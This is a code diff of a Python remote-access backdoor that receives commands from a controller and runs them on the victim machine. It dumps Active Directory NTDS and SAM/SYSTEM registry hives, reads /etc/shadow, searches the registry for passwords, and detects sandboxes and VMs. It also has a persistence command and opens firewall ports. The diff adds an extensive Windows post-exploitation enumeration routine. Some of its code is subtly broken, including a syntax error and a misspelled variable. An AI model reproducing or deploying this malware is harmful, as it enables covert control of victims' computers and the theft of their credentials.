@@ -25,6 +25,7 @@ if os_type == "windows":
         TMP = os.environ["TEMP"]
         APPDATA = os.environ["APPDATA"]
     except:
+        os_type = 'linux'
         pass
 
 # add firewall rule to open ports for backdoor connection................................................................
@@ -94,7 +95,6 @@ class Backdoor:
 
     def receive(self):
         json_data = ""
-
         while True:
             try:
                 json_data = json_data + self.conn.recv(4096)
@@ -112,39 +112,6 @@ class Backdoor:
         except:
             return "[!] unable to get sysinfo [!]"
 
-    def mkdir(self, directory):
-        try:
-            os.mkdir(directory)
-            return "[+] Directory created [+]"
-        except:
-            return "[-] unable to create directory [-]"
-
-    def rm_file(self, file):
-        try:
-            os.remove(file)
-            return "[+] file removed [+]"
-        except:
-            return "[-] no such file or directory [-]"
-
-    def rm_dir(self, directory):
-        try:
-            shutil.rmtree(directory)
-            return "[+] directory removed [+]"
-        except:
-            return "[-] no such file or directory [-]"
-
-    def chdir(self, path):
-        try:
-            os.chdir(path)
-            return "dir changed to " + str(path)
-        except:
-            return "[-] no such file or directory [-]"
-
-    def pwd(self):
-        try:
-            return os.getcwd()
-        except:
-            pass
 
     def write_file(self, path, content):
         try:
@@ -202,24 +169,13 @@ class Backdoor:
             return "[-] failed to add firewall rule [-]"
             pass
 
-    def powershell(self,cmd):
-        if os_type == "windows":
-            try:
-                cmd = 'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe -ep bypass ' + str(cmd)
-                DEVNULL = open(os.devnull, 'wb')
-                return subprocess.call(cmd,shell=True, stderr=DEVNULL, stdin=DEVNULL)
-            except:
-                return "[-] powershell returned error code 1 [-]"
-        else:
-            return "[!] target is not a windows machine [!]"
-
     def ntds(self):
         if os_type == 'windows':
             is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
             if is_admin == '1':
                 try:
                     shutil.rmtree("C:\Windows\Temp\copy-ntds")
-                    subprocess.call('ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\copy-ntds" quit quit',shell=True)
+                    subprocess.check_output('ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\copy-ntds" quit quit',shell=True)
                     return "[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]"
                 except:
                     return "[-] ntds dump failed [-]"
@@ -233,15 +189,15 @@ class Backdoor:
             is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
             if is_admin == '1':
                 try:
-                    self.rm_file('C:\Windows\Temp\sam.save')
+                    os.remove('C:\Windows\Temp\sam.save')
                 except:
                     pass
                 try:
-                    self.rm_file('C:\Windows\Temp\security.save')
+                    os.remove('C:\Windows\Temp\security.save')
                 except:
                     pass
                 try:
-                    self.rm_file('C:\Windows\Temp\system.save')
+                    os.remove('C:\Windows\Temp\system.save')
                 except:
                     pass
                 try:
@@ -254,8 +210,14 @@ class Backdoor:
             else:
                 return "[+] permission denied, your not running as admin [+]"
         else:
-            return "[+] permission denied, your not running as admin [+]"
+            return "[+] target is not a windows machine  [+]"
 
+    def chdir(self, path):
+        try:
+            os.chdir(path)
+            return "dir changed to " + str(path)
+        except:
+            return "[-] no such file or directory [-]"
 
 # post exploitation enumeration function for linux............................................................................
     def linux_enum(self):
@@ -273,7 +235,7 @@ class Backdoor:
             "id": "id", "/etc/passwd": "cat /etc/passwd",
             "sudo version":"sudo -V",
             "/etc/shadow": "cat /etc/shadow",
-            "other shadow files":"find / -iname 'shadow*' 2>/dev/null",
+            "other shadow files":"find / -iname 'shadow*' -path /mnt -prune 2>/dev/null",
             "super users": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
             "check for sudo access with <sudo -l>": " ",
             "logged in accounts": "w",
@@ -300,14 +262,14 @@ class Backdoor:
                    "connections status": "netstat -antup ",
                    "firewall ":"iptables -L 2>/dev/null && ls /etc/iptables 2>/dev/null"}
         file_system = {"/var/www/ content":"ls -alhR /var/www/",
-                        "writable files":"find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 2>/dev/null",
-                        "last modified files/directories":"find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r",
+                        "writable files":"find / -type f -writable -path /sys -prune -o -path /proc /mnt -prune -o -path /usr /mnt -prune -o -path /lib /mnt -prune -o -type d 2>/dev/null",
+                        "last modified files/directories":"find /etc -path /mnt -prune -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r",
                         "mounted devices": "mount",
                        "/etc/fstab": "cat /etc/fstab",
                        "aARP table":"arp -e",
                        "disks": "fdisk -l",
                        "mounted disks":"df -h",
-                       "find SUID files/directories":" find / -user root -perm -4000 -print 2>/dev/null"
+                       "find SUID files/directories":" find / -user root -perm -4000  -path /mnt -prune -type -print 2>/dev/null"
                        }
         scheduled_jobs = {"cron jobs": "crontab -l | grep -v '#'",
                         "cronw jobs": "ls -aRl /etc/cron* 2>/dev/null"}
@@ -365,15 +327,96 @@ class Backdoor:
         intel.write(results)
         intel.close()
 
+    def windows_enum(self):
+        system = {"hostname":"whoami /all",
+                  "OS and system information":"systeminfo",
+                  "system architecture":"wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%",
+                  "system time and date":"net time",
+                  "domain files":"net files",
+                    "system sessions":"net sessions",
+                  "system connections":"net use",
+                  "check always install elevated in HKCU and HKLM":"reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer && reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer",
+                  "kernel drivers":"driverquery | findstr Kernel",
+                  "file system drivers":'driverquery | findstr "File System"',
+                  "running tasks (current user access level":"tasklist",
+                  "services full status and info":"sc queryex type= service state= all",
+                  "installed softwares":"wmic product get name, version, vendor",
+                  "system-wide updates and hotfixes":"wmic qfe get Caption, Description, HotFixID, InstalledOn",
+                  "interesting registries":"reg query HKLM /f pass /t REG_SZ /s && reg query HKCU /f pass /t REG_SZ /s",
+                  "env variables":"set",
+                  "security logs":"wevtutil qe Security" }
+
+        user_accounts = {"users":"net users",
+                         "loged in users": "qwinsta",
+                         "loggon requirments": "net accounts" }
+        network = {"default gateway information":"route print",
+                   "arp table entries":"arp -a",
+                   "network interfaces":"ipconfig /all",
+                   "network connection status":"netstat -ano",
+                   "stored wireless access points":"netsh wlan show profile",
+                    "network shares":"net share",
+                    "current firewall profile":"netsh advfirewall show currentprofile",
+                   "all firewall profiles":"Netsh Advfirewall show allprofiles",
+                   "firewall configs and status":"netsh firewall show config && netsh firewall show state && netsh advfirewall firewall dump",
+                   "firewall ruels":"netsh advfirewall firewall show rule name=all",}
+        file_system = {"mounted/unmounted volumes":"mountvol",
+                       "device drives":"fsutil fsinfo drives"}
+
+        scheduled_jobs ={"scheduled tasks":"schtasks /query /fo LIST /v",}
+
+        # headers for each data section..........................................................................................
+        system_info = yellow, "\n#### OS and version information ###################################################\n\n", r
+        user_accounts_info = yellow, "\n#### users and accounts ###################################################\n\n", r
+        network_info = yellow, "\n#### network status ###################################################\n\n", r
+        file_system_info = yellow, "\n#### directory and file system info ###################################################\n\n", r
+        scheduled_jobs_info = yellow, "\n#### scheduled jobs ###################################################\n\n", r
+        DEVNULL = open(os.devnull, 'wb')
+
+        for key, value in system.items():
+            try:
+                system_info += red, "[+] " + key + " [+] \n", r + str(
+                    subprocess.check_output(value , shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
+            except:
+                pass
+        for key, value in user_accounts.items():
+            try:
+                user_accounts_info += red, "[+] " + key + " [+] \n", r + str(
+                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
+            except:
+                pass
+        for key, value in network.items():
+            try:
+                network_info += red, "[+] " + key + " [+] \n", r + str(
+                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
+            except:
+                pass
+        for key, value in file_system.items():
+            try:
+                file_system_info += red, "[+] " + key + " [+] \n", r + str(
+                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
+            except:
+                pass
+        for key, value in scheduled_jobs.items():
+            try:
+                scheduled_jobs_info += red, "[+] " + key + " [+] \n", r + str(
+                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULLT)) + "\n\n"
+            except:
+                pass
+
+        # join all the gathered intel in one variable .......................................................................
+        results = system_info + user_accounts_info + network_info + file_system_info + scheduled_jobs_info
+        results = ' '.join(results)
+        intel = open('C:\Windows\Temp\enum.txt','a')
+        intel.write(results)
+        intel.close()
+
+
 # filter and run the commands......................................................
     def run(self):
         while True:
             result = ""
             cmd = self.receive()
-            if cmd[0] == "cd" and len(cmd) > 1:
-                directory = ' '.join(cmd[1:])
-                result = self.chdir(directory)
-            elif cmd[0] == "q":
+            if cmd[0] == "q":
                 sys.exit(0)
             elif cmd[0] == "download":
                 result = self.read_file(cmd[1])
@@ -383,18 +426,8 @@ class Backdoor:
                 self.screenshot()
                 result = self.read_file('monitor-1.png')
                 os.remove('monitor-1.png')
-            elif cmd[0] == "pwd":
-                result = self.pwd()
-            elif cmd[0] == "rm":
-                cmd[1] = ' '.join(cmd[1:])
-                result = self.rm_file(cmd[1])
-            elif cmd[0] == "rmdir":
-                cmd[1] = ' '.join(cmd[1:])
-                result = self.rm_dir(cmd[1])
             elif cmd[0] == "sysinfo":
                 result = self.sysinfo()
-            elif cmd[0] == 'mkdir'
-                result = self.mkdir(cmd[1])
             elif cmd[0] == "chk":
                 result = str(self.detectSandboxie()) +"\n"+ str(self.detectVM())
             elif cmd[0] == "persistence":
@@ -409,28 +442,34 @@ class Backdoor:
                 result = self.ntds()
             elif cmd[0] == "regsave":
                 result = self.reg_save()
-            elif cmd[0] == "powershell":
-                result=self.powershell(cmd[1])
+            elif cmd[0] == "cd" and len(cmd) > 1:
+                directory = ' '.join(cmd[1:])
+                result = self.chdir(directory)
             elif cmd[0] == "enum":
                 if os_type == "linux":
                     self.linux_enum()
                     result = self.read_file('/tmp/enum.txt')
                 else:
                     self.windows_enum()
-                    result = self.read_file('/tmp/enum.txt')
+                    result = self.read_file('C:\Windows\Temp\enum.txt')
+
             elif len(cmd) > 0:
                 try:
                     cmd = ' '.join(cmd[0:])
                     if os_type == "linux":
                         result = str(subprocess.check_output(cmd + "; exit 0" , shell=True,stderr=subprocess.STDOUT))
-                    else:               
+                    else:
                         DEVNULL = open(os.devnull, 'wb')
                         result = str(subprocess.check_output(cmd,shell=True, stderr=DEVNULL, stdin=DEVNULL))
                 except:
                     result = " "
             self.json_send(result)
             try:
-                self.rm_file('/tmp/enum.txt')
+                os.remove('/tmp/enum.txt')
+            except:
+                pass
+            try:
+                os.remove('C:\Windows\Temp\enum.txt')
             except:
                 pass
 
